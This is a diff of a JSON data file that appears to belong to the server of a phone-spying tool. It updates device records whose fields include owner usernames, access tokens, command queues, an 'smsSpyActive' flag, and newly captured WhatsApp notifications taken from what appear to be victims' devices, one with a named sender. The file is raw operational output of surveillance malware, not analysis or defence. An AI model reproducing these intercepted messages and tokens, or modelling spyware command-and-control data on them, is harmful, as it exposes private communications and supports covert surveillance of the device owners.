@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776767928994,
+    "lastSeen": 1776767930111,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 18:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767931992
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8610,7 +8618,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776767927823,
+    "lastSeen": 1776767930549,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -8651,7 +8659,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776767926190,
+    "lastSeen": 1776767931381,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -8667,6 +8675,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Gopit Dki",
+        "content": "Menyukai status Anda",
+        "time": "21/04 17:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767929783
+      },
       {
         "appName": "WhatsApp",
         "sender": "Gopit Dki",
